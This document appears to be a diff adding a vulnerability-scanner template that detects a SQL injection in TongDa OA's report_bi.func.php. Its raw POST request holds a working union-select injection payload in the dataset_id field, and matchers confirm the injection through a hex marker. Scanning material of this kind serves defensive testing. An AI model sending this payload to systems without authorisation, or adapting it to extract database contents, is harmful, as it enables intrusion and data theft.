@@ -1,0 +1,29 @@
+id: tongda-oa-sqli
+
+info:
+  name: TongDa OA report_bi.func.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in TongDa OA, which can be used by attackers to obtain sensitive database information.
+  tags: sqli
+  reference:
+    - https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe
+
+http:
+  - raw:
+      - |
+        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _POST[dataset_id]=efgh'-@`'`)union select 0x313439346435333938633862396666323965343763383331,2,user()#'&action=get_link_info&
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1494d5398c8b9ff29e47c831"
+        part: body
